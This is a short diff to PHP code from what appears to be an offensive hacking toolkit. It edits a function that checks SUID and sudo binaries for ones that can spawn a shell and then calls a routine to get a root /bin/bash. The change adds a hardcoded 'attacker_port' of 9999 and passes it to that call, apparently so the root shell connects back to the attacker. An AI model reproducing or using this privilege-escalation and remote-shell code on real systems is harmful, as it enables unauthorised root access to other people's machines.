@@ -871,7 +871,8 @@ This can be used to help determine the OS running and the last time it's been fu
     public function lan2root8bin($bin_path,$sudo,$userpass){
         $this->ssTitre(__FUNCTION__);
         $filepath = trim($bin_path);
-        
+        $attacker_port = rand(1024,65535);
+        $attacker_port = 9999;
         $data = "ls -al $filepath";
         $this->lan2stream4result($data, $this->stream_timeout);
         
@@ -880,7 +881,7 @@ This can be used to help determine the OS running and the last time it's been fu
            
             if (in_array($obj_suid->file_name, $this->tab_sudo8app2shell) ) {
                 $cmd_id = "%ID%";
-                $id = $obj_suid->elf4root2cmd($this->ip,"","/bin/bash",$sudo,$userpass, $cmd_id);
+                $id = $obj_suid->elf4root2cmd($this->ip,$attacker_port,"/bin/bash",$sudo,$userpass, $cmd_id);
                 $this->pause();
                 $template_id_test = str_replace("%ID%", $id, $this->template_id);
                 
